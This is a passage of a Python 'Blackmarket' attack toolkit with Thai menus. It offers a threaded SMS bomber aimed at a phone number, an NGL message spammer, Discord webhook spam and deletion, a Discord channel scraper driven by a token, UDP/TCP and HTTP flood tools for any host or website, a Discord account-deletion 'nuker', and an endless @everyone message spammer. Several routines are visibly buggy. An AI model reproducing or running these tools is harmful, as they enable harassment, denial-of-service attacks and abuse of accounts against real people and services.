    print(Colorate.Horizontal(Colors.rainbow, "================================================================"))
    print()
    targetPhone = input("    \x1b[36m[\x1b[00m!\x1b[36m] \x1b[32mPHONE-NUMBER  \x1b[00m: \x1b[36m")
    Amount = int(input("    \x1b[36m[\x1b[00m!\x1b[36m] \x1b[32mNUMBER-ATTACK \x1b[00m: \x1b[36m"))
    print()
    print(Colorate.Horizontal(Colors.rainbow, "================================================================"))
    print()
    
    for i in range(Amount):
            threading.Thread(target=api1, args=[targetPhone]).start()
            threading.Thread(target=api2, args=[targetPhone]).start()
            threading.Thread(target=api3, args=[targetPhone]).start()
            threading.Thread(target=api4, args=[targetPhone]).start()
            threading.Thread(target=api5, args=[targetPhone]).start()
            threading.Thread(target=api6, args=[targetPhone]).start()
            threading.Thread(target=api7, args=[targetPhone]).start()
            threading.Thread(target=api8, args=[targetPhone]).start()
            threading.Thread(target=api9, args=[targetPhone]).start()
            threading.Thread(target=api10, args=[targetPhone]).start()
            threading.Thread(target=api11, args=[targetPhone]).start()
            threading.Thread(target=api12, args=[targetPhone]).start()
            threading.Thread(target=api13, args=[targetPhone]).start()
            threading.Thread(target=api14, args=[targetPhone]).start()
            threading.Thread(target=api15, args=[targetPhone]).start()
            threading.Thread(target=api16, args=[targetPhone]).start()
            threading.Thread(target=api17, args=[targetPhone]).start()
            threading.Thread(target=api18, args=[targetPhone]).start()
            threading.Thread(target=api19, args=[targetPhone]).start()
            threading.Thread(target=api20, args=[targetPhone]).start()
    
    
    
    
def spamngl():
    os.system("clear")
    print(bannerbmk)
    time.sleep(0.8)
    os.system("clear")
    print(Colorate.Horizontal(Colors.green_to_yellow,"กำลังเข้าโปรแกรมSpamngl!!!"))
    time.sleep(1.5)
    os.system("clear")
    print(Colorate.Horizontal(Colors.blue_to_purple,"▁  "))
    time.sleep(0.5)
    os.system("clear")
    print(Colorate.Horizontal(Colors.blue_to_purple,"▁ ▂ "))
    time.sleep(0.5)
    os.system("clear")
    print(Colorate.Horizontal(Colors.blue_to_purple,"▁ ▂ ▃ "))
    time.sleep(0.5)
    os.system("clear")
    print(Colorate.Horizontal(Colors.blue_to_purple,"▁ ▂ ▃ ▄"))
    time.sleep(0.5)
    os.system("clear")
    print(Colorate.Horizontal(Colors.blue_to_purple,"▁ ▂ ▃ ▄ ▅"))
    time.sleep(0.5)
    os.system("clear")
    print(Colorate.Horizontal(Colors.blue_to_purple,"▁ ▂ ▃ ▄ ▅ ▆"))
    time.sleep(0.5)
    os.system("clear")
    print(Colorate.Horizontal(Colors.blue_to_purple,"▁ ▂ ▃ ▄ ▅ ▆ ▇"))
    time.sleep(1)
    os.system("clear")
    print(rainbowbanner)
    nglusername = input(Colorate.Vertical(Colors.blue_to_purple,"Username: "))
    message = input(Colorate.Vertical(Colors.blue_to_purple,"Message: "))
    Count = int(input(Colorate.Vertical(Colors.blue_to_purple,"Count:")))

    print(Colorate.Vertical(Colors.green_to_blue,"**********************************************************"))
    
    headers = {
            'Host': 'ngl.link',
            'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
            'accept': '*/*',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'x-requested-with': 'XMLHttpRequest',
            'sec-ch-ua-mobile': '?0',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
            'sec-ch-ua-platform': '"Windows"',
            'origin': 'https://ngl.link',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': f'https://ngl.link/{nglusername}',
            'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
        }

    data = {
            'username': f'{nglusername}',
            'question': f'{message}',
            'deviceId': '0',
            'gameSlug': '',
            'referrer': '',
        }
    
    def ngl1(target):
        response = requests.post('https://ngl.link/api/submit',headers=headers, data=data)
        if response.status_code == 200:
            notsend = 0
            value += 1
            print(G+"[+]"+W+"Send =>"+G+"{}".format(value)+W)
            
    def ngl2(target):
        response = requests.post('https://ngl.link/api/submit',headers=headers, data=data)
        if response.status_code == 200:
            notsend = 0
            value += 1
            print(G+"[+]"+W+"Send =>"+G+"{}".format(value)+W)
            
    def ngl3(target):
        response = requests.post('https://ngl.link/api/submit',headers=headers, data=data)
        if response.status_code == 200:
            notsend = 0
            value += 1
            print(G+"[+]"+W+"Send =>"+G+"{}".format(value)+W)
            
    def ngl4(target):
        response = requests.post('https://ngl.link/api/submit',headers=headers, data=data)
        if response.status_code == 200:
            notsend = 0
            value += 1
            print(G+"[+]"+W+"Send =>"+G+"{}".format(value)+W)
            
    def ngl5(target):
        response = requests.post('https://ngl.link/api/submit',headers=headers, data=data)
        if response.status_code == 200:
            notsend = 0
            value += 1
            print(G+"[+]"+W+"Send =>"+G+"{}".format(value)+W)
            
    def ngl6(target):
        response = requests.post('https://ngl.link/api/submit',headers=headers, data=data)
        if response.status_code == 200:
            notsend = 0
            value += 1
            print(G+"[+]"+W+"Send =>"+G+"{}".format(value)+W)
            
    def ngl7(target):
        response = requests.post('https://ngl.link/api/submit',headers=headers, data=data)
        if response.status_code == 200:
            notsend = 0
            value += 1
            print(G+"[+]"+W+"Send =>"+G+"{}".format(value)+W)
            
    def ngl8(target):
        response = requests.post('https://ngl.link/api/submit',headers=headers, data=data)
        if response.status_code == 200:
            notsend = 0
            value += 1
            print(G+"[+]"+W+"Send =>"+G+"{}".format(value)+W)
            
    def ngl9(target):
        response = requests.post('https://ngl.link/api/submit',headers=headers, data=data)
        if response.status_code == 200:
            notsend = 0
            value += 1
            print(G+"[+]"+W+"Send =>"+G+"{}".format(value)+W)
            
    def ngl10(target):
        response = requests.post('https://ngl.link/api/submit',headers=headers, data=data)
        if response.status_code == 200:
            notsend = 0
            value += 1
            print(G+"[+]"+W+"Send =>"+G+"{}".format(value)+W)
            
    def ngl11(target):
        response = requests.post('https://ngl.link/api/submit',headers=headers, data=data)
        if response.status_code == 200:
            notsend = 0
            value += 1
            print(G+"[+]"+W+"Send =>"+G+"{}".format(value)+W)
            
    def ngl12(target):
        response = requests.post('https://ngl.link/api/submit',headers=headers, data=data)
        if response.status_code == 200:
            notsend = 0
            value += 1
            print(G+"[+]"+W+"Send =>"+G+"{}".format(value)+W)
            
    def ngl13(target):
        response = requests.post('https://ngl.link/api/submit',headers=headers, data=data)
        if response.status_code == 200:
            notsend = 0
            value += 1
            print(G+"[+]"+W+"Send =>"+G+"{}".format(value)+W)
            
    def ngl14(target):
        response = requests.post('https://ngl.link/api/submit',headers=headers, data=data)
        if response.status_code == 200:
            notsend = 0
            value += 1
            print(G+"[+]"+W+"Send =>"+G+"{}".format(value)+W)
            
    def ngl15(target):
        response = requests.post('https://ngl.link/api/submit',headers=headers, data=data)
        if response.status_code == 200:
            notsend = 0
            value += 1
            print(G+"[+]"+W+"Send =>"+G+"{}".format(value)+W)
            
    def ngl16(target):
        response = requests.post('https://ngl.link/api/submit',headers=headers, data=data)
        if response.status_code == 200:
            notsend = 0
            value += 1
            print(G+"[+]"+W+"Send =>"+G+"{}".format(value)+W)
            
    def ngl17(target):
        response = requests.post('https://ngl.link/api/submit',headers=headers, data=data)
        if response.status_code == 200:
            notsend = 0
            value += 1
            print(G+"[+]"+W+"Send =>"+G+"{}".format(value)+W)
            
    def ngl18(target):
        response = requests.post('https://ngl.link/api/submit',headers=headers, data=data)
        if response.status_code == 200:
            notsend = 0
            value += 1
            print(G+"[+]"+W+"Send =>"+G+"{}".format(value)+W)
            
    def ngl19(target):
        response = requests.post('https://ngl.link/api/submit',headers=headers, data=data)
        if response.status_code == 200:
            notsend = 0
            value += 1
            print(G+"[+]"+W+"Send =>"+G+"{}".format(value)+W)
            
    def ngl20(target):
        response = requests.post('https://ngl.link/api/submit',headers=headers, data=data)
        if response.status_code == 200:
            notsend = 0
            value += 1
            print(G+"[+]"+W+"Send =>"+G+"{}".format(value)+W)
            
    def ngl21(target):
        response = requests.post('https://ngl.link/api/submit',headers=headers, data=data)
        if response.status_code == 200:
            notsend = 0
            value += 1
            print(G+"[+]"+W+"Send =>"+G+"{}".format(value)+W)
            
    def ngl22(target):
        response = requests.post('https://ngl.link/api/submit',headers=headers, data=data)
        if response.status_code == 200:
            notsend = 0
            value += 1
            print(G+"[+]"+W+"Send =>"+G+"{}".format(value)+W)
            
    def ngl23(target):
        response = requests.post('https://ngl.link/api/submit',headers=headers, data=data)
        if response.status_code == 200:
            notsend = 0
            value += 1
            print(G+"[+]"+W+"Send =>"+G+"{}".format(value)+W)
            
    def ngl24(target):
        response = requests.post('https://ngl.link/api/submit',headers=headers, data=data)
        if response.status_code == 200:
            notsend = 0
            value += 1
            print(G+"[+]"+W+"Send =>"+G+"{}".format(value)+W)
            
    def ngl25(target):
        response = requests.post('https://ngl.link/api/submit',headers=headers, data=data)
        if response.status_code == 200:
            notsend = 0
            value += 1
            print(G+"[+]"+W+"Send =>"+G+"{}".format(value)+W)

    value =0
    notsend =0
    for value in range(Count):
        threading.Thread(target=ngl1, args=[nglusername]).start()
        threading.Thread(target=ngl2, args=[nglusername]).start()
        threading.Thread(target=ngl3, args=[nglusername]).start()
        threading.Thread(target=ngl4, args=[nglusername]).start()
        threading.Thread(target=ngl5, args=[nglusername]).start()
        threading.Thread(target=ngl6, args=[nglusername]).start()
        threading.Thread(target=ngl7, args=[nglusername]).start()
        threading.Thread(target=ngl8, args=[nglusername]).start()
        threading.Thread(target=ngl9, args=[nglusername]).start()
        threading.Thread(target=ngl10, args=[nglusername]).start()
        threading.Thread(target=ngl11, args=[nglusername]).start()
        threading.Thread(target=ngl12, args=[nglusername]).start()
        threading.Thread(target=ngl13, args=[nglusername]).start()
        threading.Thread(target=ngl14, args=[nglusername]).start()
        threading.Thread(target=ngl15, args=[nglusername]).start()
        threading.Thread(target=ngl16, args=[nglusername]).start()
        threading.Thread(target=ngl17, args=[nglusername]).start()
        threading.Thread(target=ngl18, args=[nglusername]).start()
        threading.Thread(target=ngl19, args=[nglusername]).start()
        threading.Thread(target=ngl20, args=[nglusername]).start()
        threading.Thread(target=ngl21, args=[nglusername]).start()
        threading.Thread(target=ngl22, args=[nglusername]).start()
        threading.Thread(target=ngl23, args=[nglusername]).start()
        threading.Thread(target=ngl24, args=[nglusername]).start()
        threading.Thread(target=ngl25, args=[nglusername]).start()
        
def spamwebhook():
    os.system("clear")
    print(bannerbmk)
    time.sleep(0.8)
    os.system("clear")
    print(Colorate.Horizontal(Colors.green_to_yellow,"กำลังเข้าโปรแกรมสแปมเว็ปฮุ้ก!!!"))
    time.sleep(1.5)
    os.system("clear")
    print(Colorate.Horizontal(Colors.blue_to_purple,"▁  "))
    time.sleep(0.5)
    os.system("clear")
    print(Colorate.Horizontal(Colors.blue_to_purple,"▁ ▂ "))
    time.sleep(0.5)
    os.system("clear")
    print(Colorate.Horizontal(Colors.blue_to_purple,"▁ ▂ ▃ "))
    time.sleep(0.5)
    os.system("clear")
    print(Colorate.Horizontal(Colors.blue_to_purple,"▁ ▂ ▃ ▄"))
    time.sleep(0.5)
    os.system("clear")
    print(Colorate.Horizontal(Colors.blue_to_purple,"▁ ▂ ▃ ▄ ▅"))
    time.sleep(0.5)
    os.system("clear")
    print(Colorate.Horizontal(Colors.blue_to_purple,"▁ ▂ ▃ ▄ ▅ ▆"))
    time.sleep(0.5)
    os.system("clear")
    print(Colorate.Horizontal(Colors.blue_to_purple,"▁ ▂ ▃ ▄ ▅ ▆ ▇"))
    time.sleep(1)
    os.system("clear")
    print(Colorate.Horizontal(Colors.red_to_yellow, "*********************************************************************"))
    print()
    print(Colorate.Horizontal(Colors.purple_to_red, "                     [1] Spamwebhook"))
    print(Colorate.Horizontal(Colors.purple_to_red, "                     [2] Deletewebhook"))
    print()
    print(Colorate.Horizontal(Colors.red_to_yellow, "*********************************************************************"))
    print()
    select = input(Colorate.Horizontal(Colors.purple_to_red, "   SELECT MODE > "))
    if select == "1":
        system("clear")
        print(rainbowbanner)
        print()
        webhook = input(F"{g}WEB{w}HOOK : ")
        message = input(F"{r}MESS{w}AGE : ")
        name = input(F"{r}USER{w}NAME : ")
        amount = int(input(f"{y}AMO{w}UNT : "))
        am = 0
        print(f"{r}Sta{w}tus : {g}Waiting..")
        sleep(1)
        System.Title(f"Blackmarket - Status : Spamming To {webhook}")
        for i in range(amount):
            post(webhook,json={"username": name,"content": message})
            am = am + 1
            print(f"{b}Spamming to {g}-- {w}{webhook} {g}-- {r}Round : ({str(am)}/{str(amount)}){g}")
            System.Title(f"Blackmarket - Status : Spamming To {webhook} - Round : ({str(am)}/{str(amount)})")
        sleep(1)
        System.Title(f"Blackmarket - Status : Succeed Spam To {webhook} - Amount {amount}")
        print(f"Succeed Spam To {webhook} - Amount {amount}")
        system("clear||cls")
        Anime.Fade(Center.Center(bannersucceed), Colors.red_to_blue, Colorate.Vertical, enter=True)
        System.Title(f"Blackmarket - Status : Loading...")
        sleep(1)
        System.Title("Blackmarket - Status : Waiting For Spaming")
        system("clear||cls")
        print(Center.Center(rainbowbanner))
    elif select == "2":
        os.system("clear")
        print(Center.Center(rainbowbanner))
        webhook = input(F"{g}WEB{w}HOOK : ")
        delete(webhook)
        print(f"{b}Deleted {webhook}!!")
        sleep(1)
        Anime.Fade(Center.Center(bannersucceed), Colors.red_to_blue, Colorate.Vertical, enter=True)
        System.Title(f"Blackmarket - Status : Loading...")
        sleep(1)
        System.Title("Blackmarket - Status : Waiting For Spaming")
        system("clear||cls")
        print(Center.Center(rainbowbanner))
            
        
def copy():
    print(Colorate.Horizontal(Colors.green_to_yellow,"กำลังเข้าโปรแกรมดูดคริป-ดูดภาพ!!"))
    time.sleep(1.5)
    os.system("clear")
    print(Colorate.Horizontal(Colors.blue_to_purple,"▁  "))
    time.sleep(0.5)
    os.system("clear")
    print(Colorate.Horizontal(Colors.blue_to_purple,"▁ ▂ "))
    time.sleep(0.5)
    os.system("clear")
    print(Colorate.Horizontal(Colors.blue_to_purple,"▁ ▂ ▃ "))
    time.sleep(0.5)
    os.system("clear")
    print(Colorate.Horizontal(Colors.blue_to_purple,"▁ ▂ ▃ ▄"))
    time.sleep(0.5)
    os.system("clear")
    print(Colorate.Horizontal(Colors.blue_to_purple,"▁ ▂ ▃ ▄ ▅"))
    time.sleep(0.5)
    os.system("clear")
    print(Colorate.Horizontal(Colors.blue_to_purple,"▁ ▂ ▃ ▄ ▅ ▆"))
    time.sleep(0.5)
    os.system("clear")
    print(Colorate.Horizontal(Colors.blue_to_purple,"▁ ▂ ▃ ▄ ▅ ▆ ▇"))
    time.sleep(1)
    os.system("clear")
    print(rainbowbanner)
    print(Colorate.Horizontal(Colors.red_to_yellow, "*********************************************************************"))
    print()
    print(Colorate.Horizontal(Colors.purple_to_red, "                     [1] Copy Videos"))
    print(Colorate.Horizontal(Colors.purple_to_red, "                     [2] Copy Message"))
    print()
    print(Colorate.Horizontal(Colors.red_to_yellow, "*********************************************************************"))
    print()
    select = input(Colorate.Horizontal(Colors.purple_to_red, "   SELECT MODE > "))
    if select == "1":
        system("clear")
        print(rainbowbanner)
        print()
        token = input(Colorate.Horizontal(Colors.purple_to_red, "   INPUT TOKEN > "))
        ch = input(Colorate.Horizontal(Colors.purple_to_red, "   INPUT CHANNEL(ID) > ")); ww = input(Colorate.Horizontal(Colors.purple_to_red, "   INPUT WEBHOOK > "))
        print()
        res = requests.get(f"https://discord.com/api/v9/channels/{ch}/messages?limit=100",headers={"authorization": token})
        data = json.loads(res.text)
        if res.status_code == 403:
            print(Colorate.Horizontal(Colors.green_to_red, "    [ INFO ] Error Permission ! || status_code 403"))
        elif res.status_code == 401:
            print(Colorate.Horizontal(Colors.green_to_red, "    [ INFO ] Error Invild Tokens ! || status_code 401"))
        else:
            try:
                if res.json()['code'] == 10003:
                    print(Colorate.Horizontal(Colors.green_to_red, "    [ INFO ] CHANNEL ERROR ! || status_code 404 "))
                elif res.json()['code'] == 50035:
                    print(Colorate.Horizontal(Colors.green_to_red, "    [ INFO ] CHANNEL ERROR ! || status_code 404 "))
            except:
                for db in data:
                    try:
                        for vedio in db['attachments']:
                            print(Colorate.Horizontal(Colors.green_to_red, f" {vedio['url']}")); requests.post(ww,json={'content': vedio['url']})
                    except:
                        print(Colorate.Horizontal(Colors.green_to_red, "    [ INFO ] Error Link Not || status_code 200 no"))
                        break
    elif select == "2":                               
                    os.system("clear")
                    print(rainbowbanner)
                    print()
                    token = input(Colorate.Horizontal(Colors.purple_to_red, "   INPUT TOKEN > "))
                    ch = input(Colorate.Horizontal(Colors.purple_to_red, "   INPUT CHANNEL(ID) > "))
                    print()
                    res = requests.get(f"https://discord.com/api/v9/channels/{ch}/messages?limit=100",headers={"authorization": token})
                    data = json.loads(res.text)
                    if res.status_code == 403:
                        print(Colorate.Horizontal(Colors.green_to_red, "    [ INFO ] Error Permission ! || status_code 403"))
                    elif res.status_code == 401:
                        print(Colorate.Horizontal(Colors.green_to_red, "    [ INFO ] Error Invild Tokens ! || status_code 401"))
                    else:
                        try:
                            if res.json()['code'] == 10003:
                                print(Colorate.Horizontal(Colors.green_to_red, "    [ INFO ] CHANNEL ERROR ! || status_code 404 "))
                            elif res.json()['code'] == 50035:
                                print(Colorate.Horizontal(Colors.green_to_red, "    [ INFO ] CHANNEL ERROR ! || status_code 404 "))
                        except:                     
                           for db in data:
                               try:
                                   print(Colorate.Horizontal(Colors.green_to_red, f" {db['content']}"))
                               except:
                                   print(Colorate.Horizontal(Colors.green_to_red, "    [ INFO ] Error Link Not || status_code 200 no"))
                                   break
    
def nuker():
    time.sleep(0.8)
    os.system("clear")
    print(Colorate.Horizontal(Colors.green_to_yellow,"กำลังเข้าโปรแกรมยิงเน็ต-วายฟาย!!"))
    time.sleep(1.5)
    os.system("clear")
    print(Colorate.Horizontal(Colors.blue_to_purple,"▁  "))
    time.sleep(0.5)
    os.system("clear")
    print(Colorate.Horizontal(Colors.blue_to_purple,"▁ ▂ "))
    time.sleep(0.5)
    os.system("clear")
    print(Colorate.Horizontal(Colors.blue_to_purple,"▁ ▂ ▃ "))
    time.sleep(0.5)
    os.system("clear")
    print(Colorate.Horizontal(Colors.blue_to_purple,"▁ ▂ ▃ ▄"))
    time.sleep(0.5)
    os.system("clear")
    print(Colorate.Horizontal(Colors.blue_to_purple,"▁ ▂ ▃ ▄ ▅"))
    time.sleep(0.5)
    os.system("clear")
    print(Colorate.Horizontal(Colors.blue_to_purple,"▁ ▂ ▃ ▄ ▅ ▆"))
    time.sleep(0.5)
    os.system("clear")
    print(Colorate.Horizontal(Colors.blue_to_purple,"▁ ▂ ▃ ▄ ▅ ▆ ▇"))
    time.sleep(1)
    os.system("clear")
    print(rainbowbanner)
    ip = str(input(" HOST/IP:"))
    port = int(input(" PORT:"))
    choice = str(input(" UDP(Y/N):"))	
    times = int(input(" PACKETS PER ONE CONNECTION:"))
    threads = int(input(" THREADS:"))
    def run():
        data = random._urandom(1024)
        i = random.choice(("[*]","[!]","[#]"))
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                addr = (str(ip),int(port))
                for x in range(times):
                    s.sendto(data,addr)
                    print(i +" ATTACK!!!")
            except:
                print("[!] ERROR!!!")
			
    def run2():
        data = random._urandom(16)
        i = random.choice(("[*]","[!]","[#]"))
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip,port))
                s.send(data)
                for x in range(times):
                    s.send(data)
                    print(i +" ATTACK!!!")
            except:
                s.close()
                print("[*] ERROR")
                
                for Y in range(threads):
                    if choice == 'Y':
                        th = threading.Thread(target = run)
                        th.start()
                    else:
                        th = threading.Thread(target = run2)
                        th.start()
    
def nuker_token():
    time.sleep(0.8)
    os.system("clear")
    print(Colorate.Horizontal(Colors.green_to_yellow,"กำลังเข้าโปรแกรมพังโทเค่นดิสคอร์ด!!"))
    time.sleep(1.5)
    os.system("clear")
    print(Colorate.Horizontal(Colors.blue_to_purple,"▁  "))
    time.sleep(0.5)
    os.system("clear")
    print(Colorate.Horizontal(Colors.blue_to_purple,"▁ ▂ "))
    time.sleep(0.5)
    os.system("clear")
    print(Colorate.Horizontal(Colors.blue_to_purple,"▁ ▂ ▃ "))
    time.sleep(0.5)
    os.system("clear")
    print(Colorate.Horizontal(Colors.blue_to_purple,"▁ ▂ ▃ ▄"))
    time.sleep(0.5)
    os.system("clear")
    print(Colorate.Horizontal(Colors.blue_to_purple,"▁ ▂ ▃ ▄ ▅"))
    time.sleep(0.5)
    os.system("clear")
    print(Colorate.Horizontal(Colors.blue_to_purple,"▁ ▂ ▃ ▄ ▅ ▆"))
    time.sleep(0.5)
    os.system("clear")
    print(Colorate.Horizontal(Colors.blue_to_purple,"▁ ▂ ▃ ▄ ▅ ▆ ▇"))
    time.sleep(1)
    os.system("clear")
    print(rainbowbanner)
    token = str(input("Input Tokendiscord > "))
    response = requests.delete(f"https://discordapp.com/api/v9/users/@me", headers={"Authorization": F"token"})
    if response.status_code == 401:
        print(f"โทเค่น {token} ไม่ถูกต้อง")
    elif response.status_code == 200:
        print(f"โทเค่น {token} ถูกพัง!")
    else:
        print(f"เกิดข้อผิดพลาด: {response.status_code}")

    
Anime.Fade(Center.Center(bannerbmk), Colors.red_to_blue, Colorate.Vertical, enter=True)
print(banner)
choice = input("ป้อนตัวอักษรครับ > ")
if choice == "S" or choice == "s":
    system("clear||cls")
    spamsmS()
elif choice == "W" or choice == "w":
    system("clear||cls")
    spamwebhook()
elif choice == "N" or choice == "n":
    system("clear")
    spamngl()
elif choice == "Z" or choice == "z":
    system("clear")
    os.system("clear")
    print(bannerbmk)
    time.sleep(0.8)
    os.system("clear")
    print(Colorate.Horizontal(Colors.green_to_yellow,"กำลังเข้าโปรแกรมยิงเว็ปไซต์!!"))
    time.sleep(1.5)
    os.system("clear")
    print(Colorate.Horizontal(Colors.blue_to_purple,"▁  "))
    time.sleep(0.5)
    os.system("clear")
    print(Colorate.Horizontal(Colors.blue_to_purple,"▁ ▂ "))
    time.sleep(0.5)
    os.system("clear")
    print(Colorate.Horizontal(Colors.blue_to_purple,"▁ ▂ ▃ "))
    time.sleep(0.5)
    os.system("clear")
    print(Colorate.Horizontal(Colors.blue_to_purple,"▁ ▂ ▃ ▄"))
    time.sleep(0.5)
    os.system("clear")
    print(Colorate.Horizontal(Colors.blue_to_purple,"▁ ▂ ▃ ▄ ▅"))
    time.sleep(0.5)
    os.system("clear")
    print(Colorate.Horizontal(Colors.blue_to_purple,"▁ ▂ ▃ ▄ ▅ ▆"))
    time.sleep(0.5)
    os.system("clear")
    print(Colorate.Horizontal(Colors.blue_to_purple,"▁ ▂ ▃ ▄ ▅ ▆ ▇"))
    time.sleep(1)
    os.system("clear")
    print(rainbowbanner)
    url = input(f"\x1b[36m | \x1b[32mเว็ปที่จะโจมตี > ")
    url1 = url
    url2 = url
    url3 = url
    url4 = url
    url5 = url
    url6 = url
    url7 = url
    url8 = url
    url9 = url
    url10 = url
    urll = url
    urlll = url
    urls = url
    urlss = url
    a = url
    b = url
    c = url
    d = url
    f = url
    g = url

# จำนวนคำขอ
    num_requests = int(input(f"\x1b[36m | \x1b[32mจำนวนที่จะยิง > "))

# ส่งคำขอ
    for i in range(num_requests):
        start_time = time.time()
        response = requests.get(url)
        response = requests.get(url1)
        response = requests.get(url2)
        response = requests.get(url3)
        response = requests.get(url4)
        response = requests.get(url5)
        response = requests.get(url6)
        response = requests.get(url7)
        response = requests.get(url8)
        response = requests.get(url9)
        response = requests.get(url10)
        response = requests.get(urll)
        response = requests.get(urlll)
        response = requests.get(urls)
        response = requests.get(urlss)
        response = requests.get(a)
        response = requests.get(b)
        response = requests.get(c)
        response = requests.get(d)
        response = requests.get(f)
        response = requests.get(g)
        end_time = time.time()

    # พิมพ์เวลาตอบสนอง
        print(f"\x1b[35m[\x1b[34mATTACK: {end_time - start_time}")
        
elif choice == "T" or choice == "t":
    system("clear||cls")
    os.system("clear")
    print(bannerbmk)
    time.sleep(0.8)
    system("clear")
    print(Colorate.Horizontal(Colors.green_to_yellow,"กำลังเข้าโปรแกรมสแปมข้อความโดยใช้โทเค่น!!"))
    time.sleep(1.5)
    os.system("clear")
    print(Colorate.Horizontal(Colors.blue_to_purple,"▁  "))
    time.sleep(0.5)
    os.system("clear")
    print(Colorate.Horizontal(Colors.blue_to_purple,"▁ ▂ "))
    time.sleep(0.5)
    os.system("clear")
    print(Colorate.Horizontal(Colors.blue_to_purple,"▁ ▂ ▃ "))
    time.sleep(0.5)
    os.system("clear")
    print(Colorate.Horizontal(Colors.blue_to_purple,"▁ ▂ ▃ ▄"))
    time.sleep(0.5)
    os.system("clear")
    print(Colorate.Horizontal(Colors.blue_to_purple,"▁ ▂ ▃ ▄ ▅"))
    time.sleep(0.5)
    os.system("clear")
    print(Colorate.Horizontal(Colors.blue_to_purple,"▁ ▂ ▃ ▄ ▅ ▆"))
    time.sleep(0.5)
    os.system("clear")
    print(Colorate.Horizontal(Colors.blue_to_purple,"▁ ▂ ▃ ▄ ▅ ▆ ▇"))
    time.sleep(1)
    os.system("clear")
    print(rainbowbanner)
    token =input("\x1b[38;5;201m Token : ") # โทเค่นที่จะสแปม

    channelid =input("\x1b[38;5;201m Channel id : ") # ไอดีช่องที่จะส่งข้อความ

    text =input("\x1b[38;5;201m Text : ") # ข้อความที่จะสแปม


    payload = {
           
    "content" :  text + "@everyone " + "",
    "tts" : True
    }
    header = {
    "authorization" : token
    }

    while True:
        r = requests.post(f"https://discord.com/api/v9/channels/{channelid}/messages",data=payload,headers=header)
                      
    if r.status_code == 200:
        print("\x1b[38;5;46m Spamming") # สแปมสำเร็จ
    else:
        print("\x1b[38;5;202m Failed") # สแปมไม่สำเร็จ หรือ เกิดข้อผิดพลาด
elif choice == "D":
    system("clear||cls")
    print(bannerbmk)
    time.sleep(0.8)
    os.system("clear")
    copy()
elif choice == "d":
    system("clear||cls")
    print(bannerbmk)
    time.sleep(0.8)
    os.system("clear")
    copy()
elif choice == "J" or choice == "j":
    system("clear||cls")
    print(bannerbmk)
    nuker()
elif choice == "K" or choice == "k":
    system("clear||cls")
    print(bannerbmk)
    nuker_token()
else :
    print("มึงป้อนเหี้ยอะไรมาครับ อย่าเอ๋อดิ")
    